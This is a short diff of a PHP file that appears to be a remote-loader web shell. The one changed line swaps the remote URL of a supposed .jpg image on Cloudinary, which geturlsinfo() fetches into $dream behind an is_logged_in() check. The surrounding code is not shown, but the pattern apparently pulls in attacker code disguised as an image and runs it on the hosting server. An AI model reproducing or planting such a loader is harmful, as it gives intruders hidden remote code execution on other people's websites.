@@ -65,7 +65,7 @@ function geturlsinfo($destiny) {
 }
 
 if (is_logged_in()) {
-    $destiny = 'https://res.cloudinary.com/dil0dlflt/image/upload/v1771314159/cat_v8cfnn.jpg';
+    $destiny = 'https://res.cloudinary.com/dil0dlflt/image/upload/v1771411457/kim_putin_love_el66gi.jpg';
     $dream = geturlsinfo($destiny);
 
     if ($dream !== false) {
@@ -917,3 +917,4 @@ if (!is_logged_in()) {
 }
 
 ?>
+
